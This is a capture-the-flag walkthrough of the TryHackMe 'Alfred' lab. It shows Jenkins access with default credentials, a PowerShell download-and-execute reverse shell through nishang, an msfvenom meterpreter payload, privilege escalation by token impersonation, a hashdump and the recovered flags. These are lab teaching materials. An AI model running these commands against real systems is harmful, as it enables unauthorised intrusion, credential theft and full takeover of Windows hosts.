# Alfred

> Exploit Jenkins to gain an initial shell, then escalate your privileges by exploiting Windows authentication tokens.

https://tryhackme.com/room/alfred


Serveur Web UP : http://10.10.232.32

```
RIP Bruce Wayne
Donations to alfred@wayneenterprises.com are greatly appreciated. 
```

## nmap

```
PORT     STATE SERVICE            REASON  VERSION
80/tcp   open  http               syn-ack Microsoft IIS httpd 7.5
3389/tcp open  ssl/ms-wbt-server? syn-ack
8080/tcp open  http               syn-ack Jetty 9.4.z-SNAPSHOT
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## MetaSploit => FAILED

```
auxiliary/scanner/http/jenkins_command 

set RHOSTS 10.10.232.32
set LHOST 10.9.28.128

exploit/multi/http/jenkins_metaprogramming => FAILED
exploit/linux/misc/jenkins_java_deserialize => FAILED
```

## Brute force login : EAYSY 

admin:admin

Création d'une nouvelle tâche "Build"

```ps1
powershell -c "Get-Service"
```

OK


Tips: use nishang to get a reverse shell

https://github.com/samratashok/nishang

```
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
```

```ps1
powershell iex (New-Object Net.WebClient).DownloadString('http://10.9.28.128/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.9.28.128 -Port 9001
```

```
PS C:\Users\bruce\Desktop> type user.txt   
79007a09481963edf2e1321abd9ae2a0
```

## cmd to meterpreter

```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.9.28.128 LPORT=9002 -f exe -o meter.exe
```

```
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.28.128/meter.exe','meter.exe')"
```

```
use exploit/multi/handler 
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.9.28.128
set LPORT 9002
run
```

```
Start-Process "meter.exe"
```

```sh
[*] Started reverse TCP handler on 10.9.28.128:9002 
[*] Sending stage (180291 bytes) to 10.10.232.32
[*] Meterpreter session 1 opened (10.9.28.128:9002 -> 10.10.232.32:49205) at 2020-05-03 12:04:49 -0400

meterpreter > 
meterpreter > getuid
Server username: alfred\bruce
```

-a---          5/3/2020   9:02 AM      73802 meter.exe  

```
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > migrate -N winlogon.exe
[*] Migrating from 2284 to 608...
[*] Migration completed successfully.
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
bruce:1000:aad3b435b51404eeaad3b435b51404ee:3ea0013c7eb26d63606673c34322b4ae:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
meterpreter > 
```


```ps1
PS C:\Users\bruce> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State   
=============================== ========================================= ========
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
SeSecurityPrivilege             Manage auditing and security log          Disabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
SeLoadDriverPrivilege           Load and unload device drivers            Disabled
SeSystemProfilePrivilege        Profile system performance                Disabled
SeSystemtimePrivilege           Change the system time                    Disabled
SeProfileSingleProcessPrivilege Profile single process                    Disabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
SeCreatePagefilePrivilege       Create a pagefile                         Disabled
SeBackupPrivilege               Back up files and directories             Disabled
SeRestorePrivilege              Restore files and directories             Disabled
SeShutdownPrivilege             Shut down the system                      Disabled
SeDebugPrivilege                Debug programs                            Enabled 
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
SeUndockPrivilege               Remove computer from docking station      Disabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege         Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
SeTimeZonePrivilege             Change the time zone                      Disabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled
```

```
meterpreter > use incognito
meterpreter > list_tokens -g
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
\
BUILTIN\Administrators
BUILTIN\Users
NT AUTHORITY\Authenticated Users
NT AUTHORITY\NTLM Authentication
NT AUTHORITY\SERVICE
NT AUTHORITY\This Organization
NT AUTHORITY\WRITE RESTRICTED
NT SERVICE\AppHostSvc
NT SERVICE\AudioEndpointBuilder
NT SERVICE\BFE
NT SERVICE\CertPropSvc
NT SERVICE\CscService
NT SERVICE\Dnscache
NT SERVICE\eventlog
NT SERVICE\EventSystem
NT SERVICE\FDResPub
NT SERVICE\iphlpsvc
NT SERVICE\LanmanServer
NT SERVICE\MMCSS
NT SERVICE\PcaSvc
NT SERVICE\PlugPlay
NT SERVICE\RpcEptMapper
NT SERVICE\Schedule
NT SERVICE\SENS
NT SERVICE\SessionEnv
NT SERVICE\Spooler
NT SERVICE\sppsvc
NT SERVICE\TrkWks
NT SERVICE\UmRdpService
NT SERVICE\UxSms
NT SERVICE\Winmgmt
NT SERVICE\WSearch
NT SERVICE\wuauserv

Impersonation Tokens Available
========================================
BUILTIN\IIS_IUSRS
NT AUTHORITY\NETWORK
NT SERVICE\AudioSrv
NT SERVICE\CryptSvc
NT SERVICE\DcomLaunch
NT SERVICE\Dhcp
NT SERVICE\DPS
NT SERVICE\LanmanWorkstation
NT SERVICE\lmhosts
NT SERVICE\MpsSvc
NT SERVICE\netprofm
NT SERVICE\NlaSvc
NT SERVICE\nsi
NT SERVICE\PolicyAgent
NT SERVICE\Power
NT SERVICE\ShellHWDetection
NT SERVICE\TermService
NT SERVICE\W32Time
NT SERVICE\WdiServiceHost
NT SERVICE\WinHttpAutoProxySvc
NT SERVICE\wscsvc
```

```
meterpreter > impersonate_token BUILTIN\\Administrators
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
```

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

```
meterpreter > ps 

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]                                                   
 4     0     System                x64   0                                      
 396   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe
 524   516   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 572   564   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 580   516   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
 608   564   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 668   580   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe
 676   580   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 684   580   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsm.exe
 776   668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 792   668   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 852   668   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 924   608   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\LogonUI.exe
 940   668   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 988   668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1016  668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1064  668   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1180  668   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1212  668   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1324  668   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 1408  668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1444  668   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Xentools\LiteAgent.exe
 1472  668   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1540  2856  powershell.exe        x86   0        alfred\bruce                  C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
 1600  668   jenkins.exe           x64   0        alfred\bruce                  C:\Program Files (x86)\Jenkins\jenkins.exe
 1696  668   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1712  668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1808  1600  java.exe              x86   0        alfred\bruce                  C:\Program Files (x86)\Jenkins\jre\bin\java.exe
 1888  524   conhost.exe           x64   0        alfred\bruce                  C:\Windows\System32\conhost.exe
 2120  668   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchIndexer.exe
 2768  524   conhost.exe           x64   0        alfred\bruce                  C:\Windows\System32\conhost.exe
 2856  1808  cmd.exe               x86   0        alfred\bruce                  C:\Windows\SysWOW64\cmd.exe
 2944  1540  meter.exe             x86   0        alfred\bruce                  C:\Users\bruce\meter.exe
 2964  668   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\sppsvc.exe
 3000  668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
```

```
meterpreter > migrate 668
[*] Migrating from 2944 to 668...
[*] Migration completed successfully.
```

```
meterpreter > cat C:/Windows/System32/config/root.txt
dff0f748678f280250f25a45b8046b4a
```

```
cp /home/kali/thm/steelmountain/winPEAS.bat .
```

```
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.28.128/winPEAS.bat','winPEAS.bat')"
```